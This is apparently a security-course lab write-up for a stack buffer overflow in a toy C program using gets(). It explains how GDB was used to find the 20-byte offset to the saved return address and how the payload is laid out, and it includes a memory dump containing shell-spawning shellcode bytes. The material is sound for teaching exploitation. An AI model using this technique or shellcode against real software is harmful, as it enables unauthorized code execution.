# Question 2: Spica Write-up
## Main Idea
#### (A description of the vulnerability)

The code is vulnerable because ```gets(buf)``` does not check the length of the input from the user, which lets an attacker write past the end of the buffer. We insert shellcode above the saved return address on the stack (rip) and overwrite the rip with the address of shellcode.

## Magic Numbers
#### (How any relevant “magic numbers” were determined, usually with GDB)

We first determined the address of the buffer (0xbffffc18) and the address of the rip of the orbit function (0xbffffc2c). This was done by invoking GDB and setting a breakpoint at line 5.

```
(gdb) x/16x buf
0xbffffc18:  0x41414141  0xb7e5f200  0xb7fed270  0x00000000
0xbffffc28:  0xbffffc18  0x0804842a  0x08048440  0x00000000
0xbffffc38:  0x00000000  0xb7e454d3  0x00000001  0xbffffcb4
0xbffffc48:  0xbffffcbc  0xb7fdc858  0x00000000  0xbffffc1c

(gdb) i f
Stack frame at 0xbffffc10:
 eip = 0x804841d in orbit (orbit.c:8); saved eip 0x804842a
 called by frame at 0xbffffc40
 source language c.
 Arglist at 0xbffffc28, args:
 Locals at 0xbffffc28, Previous frame's sp is 0xbffffc30
 Saved registers:
  ebp at 0xbffffc28, eip at 0xbffffc2c
```

By doing so, we learned that the location of the return address from this function was 20 bytes away from the start of the buffer (0xbffffc2c - 0xbffffc18 = 20).

## Exploit Structure
#### (A description of your exploit structure)

Here is the stack diagram (You don’t need a stack diagram in your writeup).

```
rip (0xbffffc2c)
sfp
compiler padding
buf (0xbffffc18)
```

The exploit has three parts:

1. Write 20 dummy characters to overwrite buf, the compiler padding, and the sfp.

2. Overwrite the rip with the address of shellcode. Since we are putting shellcode directly after the rip, we overwrite the rip with 0xbffffc30 (0xbffffc2c + 4).

3. Finally, insert the shellcode directly after the rip.

This causes the orbit function to start executing the shellcode at address 0xbffffc30 when it returns.

## Exploit GDB Output
#### (GDB output demonstrating the before/after of the exploit working)

When we ran GDB after inputting the malicious exploit string, we got the following output:

```
(gdb) x/16x buf
0xbffffc18:  0x61616161  0x61616161  0x61616161  0x61616161
0xbffffc28:  0x61616161  0xbffffc30  0xcd58326a 0x89c38980
0xbffffc38:  0x58476ac1  0xc03180cd  0x2f2f6850  0x2f686873
0xbffffc48:  0x546e6962  0x8953505b  0xb0d231e1  0x0080cd0b
```

After 20 bytes of garbage (blue), the rip is overwritten with 0xbffffc30 (red), which points to the shellcode directly after the rip (green).

Note: you don’t need to color-code your gdb output in your writeup.
